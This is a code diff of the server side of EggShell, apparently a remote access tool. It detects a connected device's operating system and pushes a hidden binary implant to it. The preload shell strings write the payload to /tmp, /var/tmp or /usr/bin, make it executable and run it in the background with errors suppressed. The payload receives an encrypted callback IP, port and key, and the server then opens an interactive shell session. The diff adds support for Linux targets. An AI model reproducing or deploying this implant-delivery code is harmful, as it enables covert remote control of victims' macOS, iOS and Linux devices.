@@ -47,12 +47,17 @@ class ESServer:
         self.lhost = host
         host = socket.gethostbyname(host)
         term = self.term()
+        
+        #craft shell script
         INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
+        JSON_ARGS = json.dumps({"ip":host,"port":str(port),"key":self.escryptor.key,"term":term,"debug":1})
+        ARGUMENT_LENGTH = str(len(JSON_ARGS))
         INSTRUCT_BINARY_ARGUMENT = ESEncryptor(self.binaryKey,16).encryptString(
-            json.dumps({"ip":host,"port":str(port),"key":self.escryptor.key,"term":term,"debug":1})
+            JSON_ARGS
         )
         INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
+        #listen for connection
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(('0.0.0.0', int(port)))
@@ -80,7 +85,7 @@ class ESServer:
             binaryFile = open("src/resources/esplosx", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod 777 /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod 777 /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" "+ARGUMENT_LENGTH+" 2> /dev/null &\n"
         elif "arm" in CDA:
             if verbose:
                 self.h.strinfo("Detected iOS")
@@ -88,22 +93,26 @@ class ESServer:
             payload = binaryFile.read()
             binaryFile.close()
             #TODO: change upload directory for mobile user
-            preload = "export dti='/tmp/'; if [ $UID == '0' ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod 777 $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+            preload = "export dti='/tmp/'; if [ $UID == '0' ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod 777 $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" "+ARGUMENT_LENGTH+" 2> /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
-                self.h.strinfo("Detected Linux, this isn't supported yet")
-            conn.close()
-            exit()
-            return
+                self.h.strinfo("Detected Linux")
             binaryFile = open("src/resources/esplinux", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod 777 /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
+            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod 777 /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" "+ARGUMENT_LENGTH+" &\n"
+            print preload
+        elif "GET / HTTP/1.1" in CDA:
+            conn.close()
+            print "EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file"
+            raw_input(self.h.strinfoGet("Press Enter To Continue"))
+            return
         else:
             if verbose:
                 self.h.strinfo("device unrecognized")
                 print CDA
-            conn.close();
+            conn.close()
+            raw_input(self.h.strinfoGet("Press Enter To Continue"))
             return
 
         if verbose:
@@ -123,6 +132,9 @@ class ESServer:
             #spawn our interactive shell
             s.close()
             return ESSession(uid,name,conn,s,host,port,CDA)
+        else:
+            self.h.strinfo("Unable to get computer name")
+            raw_input(self.h.strinfoGet("Press Enter To Continue"))
 
     def getip(self):
         try:
@@ -133,10 +145,8 @@ class ESServer:
         return host
 
     def singleServer(self,host,port):
-        try:
-            session = self.listen(host,port,1)
-        except KeyboardInterrupt:
-            return
+        session = self.listen(host,port,1)
+    
         
         if session and self.shell.interact(session,self) == -1:
             self.h.strinfo("closing connection")
@@ -321,7 +331,8 @@ class ESServer:
             try:
                 data += conn.recv(1024)
                 if not data:
-                    return "something went wrong"
+                    print "Something went wrong"
+                    return
                 #terminator when we are done receiving data
                 if terminator in data:
                     if islivestream:
